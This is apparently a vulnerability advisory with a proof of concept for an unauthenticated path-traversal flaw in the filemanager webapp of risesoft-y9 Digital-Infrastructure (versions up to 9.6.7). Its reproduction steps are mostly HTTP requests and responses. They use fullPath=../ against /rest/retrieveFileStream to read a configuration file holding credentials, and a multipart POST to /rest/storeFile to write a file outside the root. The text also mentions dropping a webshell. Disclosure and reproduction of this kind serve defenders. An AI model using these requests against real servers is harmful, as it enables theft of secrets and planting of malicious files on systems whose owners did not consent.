# Digital-Infrastructure — Unauthenticated Arbitrary File Read/Write in filemanager

## Introduction

The filemanager webapp of risesoft-y9 `Digital-Infrastructure` exposes `/rest/retrieveFileStream` (Y9FileController.java:136-166) and `/rest/storeFile` (:168-182) with **no authentication** (the webapp depends on zero authz). Both build the target as `new File(fileRoot + fullPath)` then `new File(path, fileName)` — `fullPath` is concatenated raw with **no canonicalization**, so an attacker supplies `../` to escape the file root and read / write any file on the server. 

## Affected versions

Digital-Infrastructure ≤ 9.6.7 (current)

## Utilize conditions

- `filemanager` webapp reachable and fileRoot set by deployment
- No authentication, no token — fully pre-auth
- Only `fullPath`/`fileName` parameters needed; `../` not blocked

---

## Vulnerability Reproduction

**Step 1** — read a file inside the configured root (baseline):

```http
GET /rest/retrieveFileStream?fullPath=&fileName=hello.txt HTTP/1.1
Host: <target>
```

Response :

```text
in-root file, nothing sensitive
```

**Step 2** — **path-traversal READ** (`fullPath=../`) reads a sensitive file outside the root:

```http
GET /rest/retrieveFileStream?fullPath=../&fileName=secret-conf.properties HTTP/1.1
Host: <target>
```

Response (server file content leaked):

![image-20260821180009832](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260821180009832.5mojgnlft6.webp)

```text
jdbc.password=SuperSecretDBPass
admin.token=repro_secret
db=km_businesss_dev
```

**Step 3** — **path-traversal WRITE** (`/rest/storeFile`, `fullPath=../`) writes an arbitrary file outside the root:

```http
POST /rest/storeFile HTTP/1.1
Host: 127.0.0.1:8077
Content-Type: multipart/form-data; boundary=----wf
Content-Length: 305

------wf
Content-Disposition: form-data; name="fullPath"

../
------wf
Content-Disposition: form-data; name="fileName"

pwned-conf.properties
------wf
Content-Disposition: form-data; name="multipartFile"; filename="pwned-conf.properties"
Content-Type: text/plain

SHELL-ISH_PAYLOAD
------wf--
```

Response :

![image-20260821180608511](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260821180608511.2h91hprowb.webp)

```text
success
```

**Step 4** — read the written file back to confirm the out-of-root write:

```http
GET /rest/retrieveFileStream?fullPath=../&fileName=pwned-conf.properties HTTP/1.1
Host: <target>
```

Response :

![image-20260821180638975](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260821180638975.5xbd9t1olx.webp)

```text
SHELL-ISH_PAYLOAD
```

On a real deployment the write face can overwrite configs / drop deployables (webshell) outside the fileRoot.

code:

![image-20260821180913781](https://github.com/fangtang7/picx-images-hosting/raw/master/Digital-Infrastructure/image-20260821180913781.73uoieqw0j.webp)
